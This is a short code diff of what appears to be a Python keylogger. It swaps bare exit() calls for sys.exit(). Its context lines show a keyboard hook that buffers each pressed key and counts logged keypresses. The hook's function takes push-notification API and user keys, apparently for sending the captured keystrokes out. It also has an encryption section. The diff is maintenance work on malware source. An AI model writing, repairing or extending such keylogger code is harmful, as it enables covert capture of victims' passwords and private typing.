@@ -44,7 +44,7 @@ if not os.path.isdir(log_dir):
     except:
         log('[*] Error creating {}'.format(log_dir), verbose)
         log('[*] Exiting with error code 1', verbose)
-        exit(1)
+        sys.exit(1)
 
 #Crypto-------------------------------------------------------------------------
 
@@ -85,7 +85,7 @@ def getOnKeyPress(buff, pb_api, pb_api_key, pb_user_key):
     def onKeyPress(event):
         
         if event.Key == 'Escape':
-            exit(0)
+            sys.exit(0)
 
         buff['buff'] += '{}\n'.format(event.Key)
         buff['keypress_log_count'] = buff['keypress_log_count'] + 1
